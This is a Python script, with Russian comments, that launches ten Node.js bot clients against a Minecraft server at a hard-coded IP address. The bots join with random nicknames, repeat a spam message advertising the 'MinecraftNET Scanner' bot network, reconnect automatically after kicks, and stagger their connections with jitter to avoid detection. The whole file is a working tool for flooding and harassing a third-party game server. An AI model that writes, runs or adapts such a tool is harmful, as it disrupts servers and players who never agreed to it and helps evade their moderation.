import json
import random
import string
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Optional
import random as _rnd  # если ещё не импортирован

HOST = "178.45.197.17"
PORT = 25565
NUM_BOTS = 10
SPAM_MESSAGE = "Вы - жертва сети ботов MinecraftNET Scanner. Подробнее на сайте: https://minecraftnet-scanner.onrender.com/"
SPAM_INTERVAL_MS = 1000
AUTH = "offline"                      # 'microsoft' если online-mode=true
NODE_BIN = "node"
WORKER = "bot_worker.js"
RECONNECT_DELAY = 12
SPAWN_STAGGER = 6.0                   # разнос коннектов по времени

PREFIXES = ["Player", "User", "Bot", "Noob", "Pro", "xX_", "GG_",
            "Sasha", "Vanya", "Dima", "Kostya", "Lena"]


def rand_nick() -> str:
    base = random.choice(PREFIXES)
    tail = "".join(random.choices(string.ascii_letters + string.digits, k=5))
    return (base + tail)[:16]


@dataclass
class Bot:
    nick: str
    proc: Optional[subprocess.Popen] = None
    alive: bool = False
    lock: threading.Lock = field(default_factory=threading.Lock)

    def send(self, payload: dict) -> None:
        if not self.proc or self.proc.poll() is not None:
            return
        try:
            self.proc.stdin.write(json.dumps(payload) + "\n")
            self.proc.stdin.flush()
        except Exception as e:
            print(f"[{self.nick}] stdin write fail: {e}", file=sys.stderr)

    def start(self) -> None:
        cfg = {
            "cmd": "start",
            "host": HOST,
            "port": PORT,
            "nick": self.nick,
            "auth": AUTH,
            "message": SPAM_MESSAGE,
            "interval": SPAM_INTERVAL_MS,
        }
        self.proc = subprocess.Popen(
            [NODE_BIN, WORKER],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
        )
        threading.Thread(target=self._read_stdout, daemon=True).start()
        threading.Thread(target=self._read_stderr, daemon=True).start()
        self.send(cfg)

    def _read_stdout(self) -> None:
        assert self.proc and self.proc.stdout
        for line in self.proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                evt = json.loads(line)
            except json.JSONDecodeError:
                print(f"[{self.nick}] raw: {line}")
                continue
            self._handle_event(evt)

    def _read_stderr(self) -> None:
        assert self.proc and self.proc.stderr
        for line in self.proc.stderr:
            line = line.rstrip()
            if line:
                print(f"[{self.nick}][stderr] {line}", file=sys.stderr)

    def _handle_event(self, evt: dict) -> None:
        e = evt.get("event")
        if e == "spawn":
            self.alive = True
            print(f"[+] {self.nick} spawned")
        elif e == "kicked":
            self.alive = False
            print(f"[!] {self.nick} kicked: {evt.get('reason')}")
            threading.Timer(RECONNECT_DELAY, self._reconnect).start()
        elif e == "end":
            self.alive = False
            print(f"[-] {self.nick} end: {evt.get('reason')}")
            threading.Timer(RECONNECT_DELAY, self._reconnect).start()
        elif e == "error":
            print(f"[x] {self.nick} error: {evt.get('msg')}", file=sys.stderr)

    def _reconnect(self) -> None:
        if self.proc and self.proc.poll() is None:
            self.send({"cmd": "restart"})
        else:
            self.start()

    def stop(self) -> None:
        self.send({"cmd": "stop"})
        if self.proc:
            try:
                self.proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self.proc.kill()

def main() -> None:
    bots = [Bot(nick=rand_nick()) for _ in range(NUM_BOTS)]

    try:
        for b in bots:
            b.start()
            # джиттер ±1.5 сек, чтобы боты не били синхронно
            time.sleep(SPAWN_STAGGER + _rnd.uniform(-1.5, 1.5))

        while True:
            time.sleep(1)
    except Exception as e:
        print(f"\nError: {e}")
        print("\n[*] shutting down bots...")
        for b in bots:
            b.stop()


if __name__ == "__main__":
    main()
